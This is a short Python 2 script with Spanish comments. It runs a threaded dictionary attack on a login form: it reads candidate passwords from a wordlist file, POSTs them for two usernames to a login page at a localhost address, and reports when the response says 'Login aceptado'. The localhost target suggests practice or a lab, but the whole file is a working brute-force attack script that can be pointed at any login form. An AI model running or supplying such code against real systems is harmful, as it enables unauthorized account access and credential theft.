import requests
import threading
import time
from bs4 import BeautifulSoup

'''
	Datos generales
'''

#Direccion url
url = "http://127.0.0.1:8000/index.html"





def fun_prueba(username):
	#Abrir archivo
	archivo = open("midiccionario.txt","r")

	'''
	Leer datos de diccionario
	'''
	for i in range(0,11):
		datos = archivo.readline()
		user = username
		clave = datos[:-1]

		'''
			Peticion POST -> data=payload
		'''
		payload = {
			"user":user,
			"clave":clave,
			"ingresar":"Ingresar"
		}
		
		response = requests.post(url, data=payload)

		estado = response.status_code


		if estado == 200:
			try:
				contenido = response.content
				
				soup = BeautifulSoup(contenido,"lxml")

				datos = soup.find_all(True, {"id":"info"})

				rpt = 0
				for tag in datos:
					for linea in tag:
						linea = str(linea)
						if linea=="Login aceptado":
							print "Clave encontrada! -->"+" User:"+user+" + Clave:"+clave
							rpt=1
				if rpt==0:
					print "User:"+user+" + Clave:"+clave+" -> Clave incorrecta!"
							
			except:
				print "Except:"+user+":"+clave+"\n"

		else:
			print "Error: " + user+":"+clave+"\n"
		
	#Cerrar archivo
	archivo.close()
	pass


def login_1():
    fun_prueba("prueba")
def login_2():
    fun_prueba("unusuario")
hilo1 = threading.Thread(target=login_1, name='Hilo 1')
hilo2 = threading.Thread(target=login_2, name='Hilo 2')


hilo1.start()
hilo2.start()

